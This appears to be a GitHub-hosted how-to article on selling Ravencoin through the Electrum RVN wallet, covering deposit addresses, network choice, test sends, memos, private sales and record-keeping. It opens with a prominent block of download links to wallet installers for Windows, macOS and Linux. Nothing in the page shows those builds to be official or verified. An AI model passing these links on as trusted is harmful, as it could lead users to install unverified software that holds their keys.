![Electrum RVN](assets/banner-article.png)

# How to Sell Ravencoin with Electrum RVN

<!-- compact-download-block -->

<p align="center">Sending RVN to an exchange, and what to check first</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
Selling RVN means sending it from your wallet to a deposit address the buyer or exchange gives you, on the Ravencoin network. Confirm the network name before you send, because an address on another chain is unrecoverable. The wallet does the send; the sale happens on the other side.

## The shape of a sale

Electrum RVN holds keys, not accounts. It has no order book, no price feed and no way to exchange RVN for anything. So every sale has the same three parts: an agreement somewhere else, a deposit address from the counterparty, and a normal send from your wallet.

That is deliberate. A wallet that could also sell would need your identity, your bank details and your balance in one place - a much larger target than a key store that signs transactions.

## Step by step, with an exchange

1. **Sell the RVN for fiat or another asset on the exchange.** The coins must be in your exchange account first, or the trade must be placed against a deposit you are about to make. Check which the exchange expects.
2. **Get the RVN deposit address and network.** It is on the deposit screen for RVN specifically. If the screen shows several networks for the same ticker, the plain Ravencoin one is the only one that works with this wallet.
3. **Send a small test first** if the amount is large. One confirmed transaction proves the address and the network, and any memo or tag field the exchange asked for got through.
4. **Send the rest** from the Send tab - [sending Ravencoin from Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/sending-ravencoin-from-electrum-rvn.md) - and keep the transaction ID.
5. **Wait for the exchange to credit it.** They wait for their own confirmation count, which is their policy rather than something the wallet controls. A deposit visible on an explorer but not in your account is waiting in their queue, not lost.
6. **Place the sell order** and withdraw the proceeds the way you deposited.

If the deposit screen asks for a memo or tag, fill it in exactly as shown. Leaving out a field the exchange asked for is the usual reason a deposit sits uncredited while their support sorts it out.

## What goes wrong, and what it costs

| Mistake | Result |
| --- | --- |
| Wrong network selected on the deposit screen | funds on a chain this wallet cannot read; not reversible |
| Address copied from an old screenshot | a deposit to a retired address, usually returned by the exchange after a support ticket |
| No memo where one is required | deposit credited late or manually |
| Selling before the deposit confirms | order rejected or unfilled |
| Sending to a stranger's address in a chat | no recourse at all |

The first two are the expensive ones, and both are prevented by copying the address from the live screen and checking the network label. The address rules are worth reading once: [Ravencoin address format in Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/ravencoin-address-format-in-electrum-rvn.md).

## Selling to a person instead

A private sale is a normal send with a person at the other end, and it carries every risk an exchange removes: no escrow, no dispute process, no identity. If you do it, agree the amount, wait for the payment to clear in a form you can reverse if it does not, and only then send. A screenshot of a bank transfer is not a payment.

Do not accept "I will send first, just confirm your seed" in any form. Anyone asking for the twelve words is taking the wallet, not buying from it - [how safe is Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/how-safe-is-electrum-rvn.md) explains why that request has no legitimate version.

## Keeping records

The wallet keeps its history and labels locally, which is enough for your own reconciliation but not a tax record. Export or note the transaction IDs, the date, the amount and the counterparty while the sale is fresh; reconstructing a year of sends from an explorer is tedious and error-prone.

## Selling assets, not RVN

A Ravencoin asset is sold the same way: the buyer gives an `R` address and you send the asset, with the fee paid in RVN. The difference is liquidity - assets trade on far fewer venues than RVN, and many buyers will want to see the asset's issuance transaction before they pay. [Transferring Ravencoin assets with Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/transferring-ravencoin-assets-with-electrum-rvn.md) covers the mechanics.

## Before you sell everything

If the sale empties the wallet, expect the fee to come out of the amount, and leave the wallet installed long enough to see the transaction confirm. Closing the application does not affect a broadcast transaction, but a wallet you have already removed is a wallet you cannot check - and [removing Electrum RVN from your computer](https://github.com/electrum-source/download-and-setup/blob/main/removing-electrum-rvn-from-your-computer.md) is a separate decision from selling.

If you are moving to a phone wallet for spending rather than selling, that is a normal send too - [Ravencoin mobile wallet vs Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/ravencoin-mobile-wallet-vs-electrum-rvn.md) - and it does not need an exchange at all.

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. Comparing it with a full-node wallet before a large sale is reasonable: [Electrum RVN vs Ravencoin Core](https://github.com/electrum-source/download-and-setup/blob/main/electrum-rvn-vs-ravencoin-core.md).

## FAQ

### Can I sell RVN inside Electrum RVN?

No. It has no exchange and no order book. You sell elsewhere and send the RVN to the buyer's or exchange's deposit address on the Ravencoin network.

### Which network do I pick on the exchange?

Ravencoin, labelled RVN. An ERC-20 or BEP-20 "RVN" is a different asset on a different chain, and neither direction works with this wallet.

### Do I need to sell the whole balance?

No. A partial send leaves the rest in the wallet; the wallet returns change to an address of its own, so the balance is correct afterwards.

### How long until the exchange credits my deposit?

Until their own confirmation count is met. A deposit that shows on an explorer but not in your account is in their queue.

### What if I sent to the wrong network?

Nothing in this wallet can recover it. Contact the receiving service; whether anything can be done depends entirely on them.

<!-- related-articles -->

## Related articles

- [Sending Ravencoin From Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/sending-ravencoin-from-electrum-rvn.md)
- [Ravencoin Address Format in Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/ravencoin-address-format-in-electrum-rvn.md)
- [How Safe Is Electrum RVN?](https://github.com/electrum-source/passphrase-backup/blob/main/how-safe-is-electrum-rvn.md)
- [Transferring Ravencoin Assets With Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/transferring-ravencoin-assets-with-electrum-rvn.md)
